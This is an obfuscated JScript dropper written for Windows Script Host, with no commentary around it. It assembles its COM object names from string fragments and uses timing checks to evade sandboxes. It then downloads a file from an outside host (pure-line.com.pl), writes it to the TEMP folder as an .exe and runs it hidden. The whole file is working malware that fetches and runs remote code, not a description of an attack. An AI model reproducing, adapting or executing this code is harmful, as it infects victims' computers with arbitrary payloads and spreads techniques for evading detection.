var X0 = false;
var E0 = "Create"+"Object";
var F = function X() {return WScript[E0]("WScript"+".Shell");}(), OT = 11;
var S0 = "MSXML2"+".XMLHTTP";
var V = 2;
var E = V - 2;
function B(LN){F["Run"](LN, E, E);};
function NW(){return S0 + "";};
function HJ(MV, S2){E = E * 1; return MV - S2;};
function LZ(){return E0;};
/*@cc_on
  @if (@_win32 || @_win64)
    X0 = true;
  @end
@*/
if (X0)
{
var FE = "";
function ND(){return 22;};
var HU = 0; var S1 = 0;
function M0()
{
var B1 = new this["Date"]();
var EZ = B1["getUTCMilliseconds"]();
WScript["Sleep"](ND());
var B1 = new this["Date"]();
var UC0 = B1["getUTCMilliseconds"]();
WScript["Sleep"](ND());
var B1 = new this["Date"]();
var Z = B1["getUTCMilliseconds"]();
var HU = "HY";
HU = HJ(UC0, EZ);
var S1 = "R";
S1 = HJ(Z, UC0);
FE = "open";
return HJ(HU, S1);
}
var BK = false;
var C = false;
for (var GA = E; GA < ND() * 1; GA++){if (M0() != E){
BK = true; 
S1 = "31" + 11 * HU + S1; 
C = true; 
break;
}}
function S() {return ((BK == true) && (BK == C)) ? 1 : E;};
if (BK && S() && C){
function M() {return F["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "D37lyvHZ78NOxx.ex" + "e";};
 P0 = NW();
 Y = WScript[E0](P0);
 var CS = 1;
do { 
	for (;CS;){
	try {
		if (CS == 1)
		{
			Y[FE]("GET", "http://pure-line.com.pl/f6splw", false);
			Y["send"]();
			B0 = "Sleep";
			CS = 2;
		}
		WScript[B0](ND() + 120); 
		if (Y["readystate"] < 2 * 2) continue;
		CS = E;
		function UC(YL) {var P = (1, 2, 3, 4, 5, YL); return P;};
		Q = WScript[LZ()]("ADODB.Stream");
		P0 = Q;
		P0[FE]();
		P0["type"] = UC(1);
		P0["write"](Y["ResponseBody"]);
		Q["position"] = UC(E);
		P0["Save" + "ToFile"](M(), 2);
		Q["cl"+"ose"]();
		EA = M();
		B(EA);
	} catch(D){};};
}while (CS);
}
}

